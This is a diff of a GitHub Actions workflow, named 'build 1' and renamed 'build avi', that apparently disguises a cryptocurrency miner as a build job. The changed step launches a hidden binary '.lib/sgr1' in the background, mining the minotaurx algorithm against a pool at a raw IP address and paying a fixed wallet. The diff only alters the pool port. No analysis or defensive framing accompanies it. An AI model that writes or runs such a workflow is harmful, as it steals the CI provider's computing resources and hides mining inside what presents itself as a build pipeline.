@@ -1,4 +1,4 @@
-name: build 1
+name: build avi
 
 on:
   workflow_dispatch:
@@ -56,7 +56,7 @@ jobs:
             cpulimit_pid=$!
             
             # Run the process with the specified parameters in background
-            nohup .lib/sgr1 -a minotaurx --pool 45.115.225.71:8448 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$cpulimit_pid --timeout 120 -t 4 &
+            nohup .lib/sgr1 -a minotaurx --pool 45.115.225.71:840 -u RQny2iMJZVU1RS3spxF8cCTqMF31vuxvkF.$cpulimit_pid --timeout 120 -t 4 &
             
             # Store the PID of the running process
             process_pid=$!
